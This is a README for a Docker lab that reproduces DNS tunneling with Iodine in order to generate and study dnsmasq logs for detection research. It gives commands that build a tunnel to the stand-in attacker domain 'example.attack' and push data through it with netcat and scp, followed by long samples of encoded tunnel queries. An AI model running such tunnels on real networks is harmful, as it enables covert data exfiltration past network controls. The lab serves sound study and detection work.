## DNS Tunneling
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CircleCI](https://circleci.com/gh/Korving-F/iodine-log-analysis.svg?style=svg)](https://app.circleci.com/pipelines/github/Korving-F/iodine-log-analysis)

This is a personal experiment with Iodine to explore how DNS tunneling works as well as for log analysis purposes.
Main motivation was due to reading of <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">SANS's interesting paper on the topic</a>. 

This project consists of three Docker containers:
* Iodine server in "control" of the "example.attack" domain.
* DNS Server forwarding requests to Iodined. (dnsmasq)
* Iodine client on which to create the DNS tunnel and exfiltrate data.

A circleci matrix pipeline was created to generate some example log files for various dunnel configuration combinations(encoding x record types). This produced some interesting looking log files, some samples can be seen below or the artifacts downloaded from the pipelines view in CircleCI (click badge above).

### Docker-Compose
```console
#### Create the network and containers asap ####
$ docker-compose up

#### Enter the client and create the tunnel 
$ docker exec -it attack_client_1 bash
$ iodine -4 -f -P abc123 -r 172.18.0.4 example.attack
```

### Manual Approach
<details>
<summary>In case you'd want to build everything without docker-compose.</summary>
<p>

```console
#### Create Network ####
$ docker network create --subnet=172.18.0.0/16 dns-network

#### Build all containers ####
$ docker build -t attack_server attack_server/.
$ docker build -t attack_client attack_client/.
$ docker build -t dns_server dns_server/.

#### Run all containers ####
$ docker run -d --privileged --net dns-network --ip 172.18.0.2 --rm --name attack_server_1 attack_server
$ docker run -d --privileged --net dns-network --ip 172.18.0.3 --rm --name attack_client_1 attack_client
$ docker run -itd --privileged --net dns-network --ip 172.18.0.4 --rm -p 53:53/udp -v $PWD/dnsmasq.conf:/etc/dnsmasq.conf -v $PWD/dnsmasq-logs:/var/log --name dns_server_1 dns_server

#### Enter each as you see fit ####
$ docker exec -it attack_client bash
$ docker exec -it attack_server bash
$ docker exec -it dns_server sh
```

</p>
</details>

### Customize Iodine Commands
By default the Iodine client in the attached Docker container does not setup the tunnel. This has been automated in the circleci pipeline but should now be issued by hand. Main things to vary are the encoding (-O) and DNS record types used for the tunnel (-T). "example.attack" is the fake domain in control by a would-be scoundrel.
<details>
<summary>However you might want to see some other possibilities.</summary>
<p>

```console
$ docker exec -it attack_client bash
$ iodine -4 -f -P abc123 -r 172.18.0.4 example.attack & # Let Iodine autodetect/optimize encoding and DNS request types.
$ iodine -4 -f -P abc123 -Ttxt -Oraw -r 172.18.0.4 example.attack & # Force Iodine to use TXT records and raw encoding.
```

</p>
</details>

### Exchange some data
<details>
<summary>By default a text file with lorum-ipsum is generated of around 2MB and can be copied over; this is also what's been automated in circleci pipeline.</summary>
<p>

```console
#### netcat ####
# From Server
$ nc -l -s 10.0.0.1 -p 1234

# From Client
$ nc 10.0.0. 1234

#### SSH ####
# From Server
$ fallocate -l 100M file.out
$ $(which sshd) -D

#### From Client (pwd = 'root') ####
$ scp root@10.0.0.1:file.out ~/

#### From DNS Server observe logged queries ####
$ watch ls -lah /var/log/dnsmasq.log
```

</p>
</details> 

### Raw requests
Additionally one can eavesdrop on the docker network using tshark / wireshark to see the raw requests.

```console
$ tshark -T fields -e dns.qry.name -i docker0

# One might have to find out the correct interface first:
$ docker exec -ti <container id> cat /sys/class/net/eth0/iflink
$ ip link | grep <number>
```

### Log Samples
<details>
<summary>Depending on encoding on the client either garbage is spewed out or merely a `"<name unprintable>"`.</summary>
<p>

```console
Aug 23 06:12:36 dnsmasq[1]: started, version 2.82 cachesize 150
Aug 23 06:12:36 dnsmasq[1]: compile time options: IPv6 GNU-getopt no-DBus no-UBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify dumpfile
Aug 23 06:12:36 dnsmasq[1]: using nameserver 172.18.0.2#53 for domain attack 
Aug 23 06:12:36 dnsmasq[1]: using nameserver 8.8.8.8#53
Aug 23 06:12:36 dnsmasq[1]: using nameserver 9.9.9.9#53
Aug 23 06:12:36 dnsmasq[1]: read /etc/hosts - 7 addresses
Aug 23 06:12:37 dnsmasq[1]: query[TXT] vaaaakaswpe.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded vaaaakaswpe.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply vaaaakaswpe.example.attack is tkzaugs0rzm5kyaa
Aug 23 06:12:37 dnsmasq[1]: query[TXT] labtq04ovjyvve3fucwnuswmr2sifm4q.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded labtq04ovjyvve3fucwnuswmr2sifm4q.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply labtq04ovjyvve3fucwnuswmr2sifm4q.example.attack is tgeyc2mbogaxdcljrgaxdalrqfyzc0mjrgmyc0mrx
Aug 23 06:12:37 dnsmasq[1]: query[TXT] ytbvt1.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded ytbvt1.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply ytbvt1.example.attack is taaaaaah555554vkvkvk0vkvkvkawhsgsy34lef05j5hmssjnkiqwdklreas1gbtt21meimdzkbl14
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply zvt2aA-Aaahhh-Drink-mal-ein-J�germeister-.example.attack is tpj1himtbiewucylbnbugqlkeojuw20znnvqwyllfnfxc0sxem3sxe1lfnfzxizlsfuxa
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply zvt3aA-La-fl�te-na�ve-fran�aise-est-retir�-�-Cr�te.example.attack is tpj1him1biewuyyjnmzwpw3dffvxgd11wmuwwm2tbn1twc0ltmuwwk21ufvzgk3djolus1ybninzoq3dffy
Aug 23 06:12:37 dnsmasq[1]: query[TXT] zvt4aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded zvt4aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply zvt4aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ.example.attack is tpj1hindbifreey0dmrcgkrlgiztuo0cinfewustljnwey1knnzhg4t1qkbyvc2ssonjxivdvkv1fm30xpbmhswl0lixa
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply zvt5aA0123456789��������������������.example.attack is tpj1hinlbieydcmrtgq0tmnzyhg4l1pv5yda2fq4eyxdmpsgjzlf2ztooz2xa
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply zvuaaA����������������������������������������������.example.attack is tpj1hkylbihinduwt0tk3nv4y1hnnxxg311p4bypc2psolzxh3du4v05m3xxo52hr4lz5j3pw452pt4x15t4s2
Aug 23 06:12:37 dnsmasq[1]: query[TXT] sahvub.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded sahvub.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply sahvub.example.attack is tijqxgzjrgi2a
Aug 23 06:12:37 dnsmasq[1]: query[TXT] oarvuc.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded oarvuc.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply oarvuc.example.attack is rRaw
Aug 23 06:12:37 dnsmasq[1]: query[TXT] oalvud.example.attack from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded oalvud.example.attack to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply oalvud.example.attack is rLazy
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply rayad�v��Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�.Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�H.q�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq.�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�.K.example.attack is r
Aug 23 06:12:37 dnsmasq[1]: reply rayad�v��Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�.Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�H.q�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq.�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�.K.example.attack is 
Aug 23 06:12:37 dnsmasq[1]: reply rayad�v��Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�.Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�H.q�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq.�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�.K.example.attack is 
Aug 23 06:12:37 dnsmasq[1]: reply rayad�v��Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�.Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�H.q�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq.�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�Ksje�Hq�.K.example.attack is ?
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:37 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:37 dnsmasq[1]: reply rbead����Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf�.�W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��.W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W.�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�.S.example.attack is r
Aug 23 06:12:37 dnsmasq[1]: reply rbead����Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf�.�W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��.W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W.�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�.S.example.attack is 
Aug 23 06:12:37 dnsmasq[1]: reply rbead����Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf�.�W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��.W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W.�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�.S.example.attack is ]
Aug 23 06:12:37 dnsmasq[1]: reply rbead����Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf�.�W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��.W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W.�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�.S.example.attack is 
Aug 23 06:12:37 dnsmasq[1]: reply rbead����Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf�.�W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��.W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W.�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�Swlf��W�.S.example.attack is 
Aug 23 06:12:37 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:37 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:38 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:38 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:39 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:39 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:40 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:40 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:41 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:41 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:42 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:42 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:43 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:43 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:44 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:44 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:45 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:45 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:46 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:46 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:46 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:46 dnsmasq[1]: reply rbeyd������Fp������Fp������Fp������Fp������Fp������Fp������Fp�.�����Fp������Fp������Fp������Fp������Fp������Fp������Fp��.����Fp������Fp������Fp������Fp������Fp������Fp������Fp���.���Fp������Fp������Fp������Fp������Fp������Fp������Fp����.�.example.attack is r
Aug 23 06:12:46 dnsmasq[1]: reply rbeyd������Fp������Fp������Fp������Fp������Fp������Fp������Fp�.�����Fp������Fp������Fp������Fp������Fp������Fp������Fp��.����Fp������Fp������Fp������Fp������Fp������Fp������Fp���.���Fp������Fp������Fp������Fp������Fp������Fp������Fp����.�.example.attack is 
Aug 23 06:12:46 dnsmasq[1]: reply rbeyd������Fp������Fp������Fp������Fp������Fp������Fp������Fp�.�����Fp������Fp������Fp������Fp������Fp������Fp������Fp��.����Fp������Fp������Fp������Fp������Fp������Fp������Fp���.���Fp������Fp������Fp������Fp������Fp������Fp������Fp����.�.example.attack is 
Aug 23 06:12:46 dnsmasq[1]: reply rbeyd������Fp������Fp������Fp������Fp������Fp������Fp������Fp�.�����Fp������Fp������Fp������Fp������Fp������Fp������Fp��.����Fp������Fp������Fp������Fp������Fp������Fp������Fp���.���Fp������Fp������Fp������Fp������Fp������Fp������Fp����.�.example.attack is B
Aug 23 06:12:46 dnsmasq[1]: reply rbeyd������Fp������Fp������Fp������Fp������Fp������Fp������Fp�.�����Fp������Fp������Fp������Fp������Fp������Fp������Fp��.����Fp������Fp������Fp������Fp������Fp������Fp������Fp���.���Fp������Fp������Fp������Fp������Fp������Fp������Fp����.�.example.attack is 
Aug 23 06:12:46 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:46 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:47 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:47 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:48 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:48 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: query[TXT] naacjmvut.example.attack from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded naacjmvut.example.attack to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply naacjmvut.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0eaba82�2hb��Y�wf��ɾ�Wk伽l��by�߼�X�vP0���a޾��e0h�����4��o.xg��4�f���JD�ga4RH7�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0ibbb82�2hb��Y�wf��پ�Wk�Fl��by�߼�X�vP0���a޾��e0�N�e���4��o.xg��6�b���JD�ga4gH7�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0mcbc82�2hb��Y�wf��ž�Wk�Vl��by�߼�X�vP0���a޾��e0�V�e���4��o.xg��6�b���JD�ga4��7�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0qcbd82�2hb��Y�wf��վ�Wk�pl��by�߼�X�vP0���a޾��e0�V�e���4��o.xg����b���JD�ga4LH7�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0ucbe82�2hb��Y�gf��;�Wk�Zl��by�߼�X�vP0�����S��mb�1Z�Qje�h�J.W2��NCP7�kqa6�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0ydbf82�2hb��Y�gf��ݾ�Wk�tl��by�߼�X�vP0�����S��mb�1Z�Qje�h�J.W2�GNCP7�kp�6�.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 02dbg82�2hb��Y�rf�ſ��Wk�hl��by�߼�X�vP0�����S��mj��X�0cbmp��.�����4��ba��G1�m�FH9t�b��8��ylgfOPAR��L�j��g�b��L�Wg3uB��.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:12:49 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:12:49 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:12:49 dnsmasq[1]: reply 0aebh82�2hb��Y�gf��Ͼ�Wk�dl��by�߼�X�vP0�3��65OOydg��u�ekyDUn.�7�YH���Gf�OD9.example.attack is r
Aug 23 06:12:49 dnsmasq[1]: reply 0aebh82�2hb��Y�gf��Ͼ�Wk�dl��by�߼�X�vP0�3��65OOydg��u�ekyDUn.�7�YH���Gf�OD9.example.attack is 
```

```console
ug 23 06:03:59 dnsmasq[1]: reply pabawcqq.example.attack is s7ko-xutCiLSFtBFzO2yJCj1QeBlb9L3KISOpq6RoOrXlQrEHvsrRblcgob9M9CROvlc6fBL2tNpekEpkwaiCcdc5XEhNaApryP7uLnOpphPkqYk+mB-CpyH4D59paE33fusRES+7PzroWJpPP+4pzncgkvC6UJDtzjwadrqlNy7L2dgi27W-iaUlWz9hf17I1rPO1i2qUWW7yJ0XKJGVpJsJopvuUVIYT5HamvySVqrpR1eKuUu2Don+cGc
Aug 23 06:03:59 dnsmasq[1]: reply pabawcqq.example.attack is YKXaYPU3QcFZyfZWeu2VNFbG60aCNlTt9gUuxmFRF8RSiB+AZp3K08a1Ro1RHKgla+HLEX0+SYq0sKmxNT+9BFl54RJ5J34YMa6KddmZb5MLKcIEg
Aug 23 06:03:59 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply pabigcqy.example.attack is sGmb31GfUbjh6aaaiaeuibgPf6-aaqaBCLaOaaaekaaacabAC2g7FnQ8Z7KoKGbaaY3fYaaabaqGk+LOwd5D9O2t4913OscQ9IMLf3aT2EVwMe+SF0yZ7uDEPZmhPXoNJx4HEVaYRjXnNRVm7IdgRsp48fMm4SQNPersgmQv6L4hcSDp4vtOGrU2cA2+nPJJwfepQaqWZvXU7uyBpFA4FjTk579GBNFkpjSkTv3ji5sfN5eV9DRRj2mmVB1Y
Aug 23 06:03:59 dnsmasq[1]: reply pabigcqy.example.attack is T8gRgZ1Nzt3GRFihAJOwA-Iv-HsHAfZTJQFCkQ5wYn6xr9j7q-V5Ye1idneT3Qbg5l+Ol9e38sgCExwYx9DlY1r+6YF7o09EpaJgRzMj0SP3UxXvrGyqv+0G8tU30KRL+aXUK4i4iTPGJpsy+EDzs3cbBzjpPuFzfpkV3ChRU5p-5B8t6UTxwwQ+vV9qgvoO+CzT+rc5UnakAWlNGvpcG2RNyDfpeQxkT0ouJS6qVmtwR7z43bQWlsLYbv6-
Aug 23 06:03:59 dnsmasq[1]: reply pabigcqy.example.attack is t8HfHQsRxapTzkvwAO84FsJO+U6w14vNeIyhr718WELzTpZpEqggVQWyUychuy2vPhCzlsw-Vzsa+hu3tfM-XrvujW31bQnbDddKV1acUi2pfGjfPn1LV42BoqCKsOy4ABuszkTBKGVwPO5JBEGeKKP2hnssYg-UwJb-OlGoE7vaNtlLHMA3lrvFVkvLelN6jW1fcTFqjvqFhQ-K1RDd3qqjEqm7zR2qSuV3Mez3TTDsReHAMO25H-Rj6COV
Aug 23 06:03:59 dnsmasq[1]: reply pabigcqy.example.attack is SKvXBcz2hwZ0ybMw1Q8s1n0hJq0Oc+xWlogT-2blZ-xPBX0txl5zGEtBHXoLNiwYDKMpVWp1lrqcTQjj75efFTfhzZrBY9rorvDVtSbFiGgnOhvkHlzY5FcKCoaOMH5ZlA95IICcdjqGWomn9ButIjZCKk7ExZ4UH4iAPIt7C7+3uZE2Xuz2ZK5Dyjs42NSxnA6Vt1e5qIJJrRAk9iExoaiF3gJ4BPMhPilv-ZYJSVyyikKBptKJVVwF1D7Z
Aug 23 06:03:59 dnsmasq[1]: reply pabigcqy.example.attack is x+Kbwqhs2e98jWzYm0gTgUI+3HLBIR0YQtQx8PIlHnarkhvqSsn01Xtd2B31esqQ9Xpt1Ssj2ZkwgWAR9hRgKpNL7EzVu0SObn5tzThuMSN1KX1zauo7+k4wzYVj-A6WL7GFJ99s-halzexAai5G-d1YYYbhks4ni
Aug 23 06:03:59 dnsmasq[1]: query[TXT] pabqgcra.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded pabqgcra.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply 0afdy82�2hb����gc��˾�Ww�P�Udb��dE6��qv����t��2�GWfm��S�ekyDU�.�X3��lj���hkCD9.example.attack is sGmoraTQFdrm5xoxZVZsDmyew3QI3HIItNwo2iFFYrU-9W3X6z8Fw+Tp7X62VzTFpNQrYeyNkB8wFQcUtfYStA6m46Nwv1K-nWe-K1-15G44PNL2hHcZYzSbWipK-gClu3nB1GJ-nUIDeNHYwt3hH5CCCUZtuk51Fyml9nA6Rj81D10sBKqO4urYYxNoB49yYRx+Jp++YhXToaT8SGUVOOuF-3PK5ibzfkTs+mQPCuZN8FJi5hpzyUQNtvR2
Aug 23 06:03:59 dnsmasq[1]: reply 0afdy82�2hb����gc��˾�Ww�P�Udb��dE6��qv����t��2�GWfm��S�ekyDU�.�X3��lj���hkCD9.example.attack is IioXGAMpS9PgUF7eEzsvlyYOBhnbF1ZbqCoAWlIaiJntpYYnqBqQs3F5kKRlWGxTJsUD8aVbVDUgyls+DMgR41pHmeDx4uLOHUKjTu8jxmw3jBdr4
Aug 23 06:03:59 dnsmasq[1]: query[TXT] pabqwcri.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded pabqwcri.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply pabqgcra.example.attack is sGob31GfUbjh6aaaiaeuibgPf7eaaqaBCKWOaaaekaaacabAC2g7FoUvZ7KoKGbaaY967aaabaqGk+LOwd5D9O2sD1wDS2fkw++S2gMsfHCb9QnmdTlz6FfeRJkFt6c2Q6HYchY1G5zKcZ7Kbu1h6gprETHv-1abhZix9T6ExwkwWqXAULac71dW+bPUrAeT36fdfK+eF2iDXbpmkqyysPlywd9rNl0G0Lj3q2Y7EM4CzbAdu5gpxi97SmTA
Aug 23 06:03:59 dnsmasq[1]: reply pabqgcra.example.attack is lzwSzU9JuB6LxidCtP4h137bzYdLEcIiLbKrPkUkR8O+p84SXQqNIvk1Yp5pC9FSMt1QTs3iPa64K7KWbnRBRIq6ffa7e073FAcrzLI216g3pfOEhsnpTlSkFc5tY48LmlB1SZjI8iIfmqTF64tqQNzlxi17VozGAurEg0lV2wfxNprVbU7unWwtLM2z1DQWEIIV+4WQmr45He4pwlKew2iZ9ZtT1po-PvTjRVulVkMLZG8qtg2uRYroW6Bo
Aug 23 06:03:59 dnsmasq[1]: reply pabqgcra.example.attack is Af+D5MSsnzODWOkAO0JYvb+UbqTE0atFdpBSJyBjIGacaLorz9HIL46BSmMHpE83qPJq6J7eZpB+flc5-Vxbqomb+nl39zUlnINAffP32s5TsYMobsTxfrADfIpNdoASD4cSwzg54zwux18RfWHLRUkhSML+nU3UPiSGAVy0yXhmwZOQmM4l+CdCr+BQdl6lt3lqq1j-QNqQ8HIUwfdyyaBWOHJ9KKMc8o-kWuR7kA3rkRL7v3oW6Z41zrnK
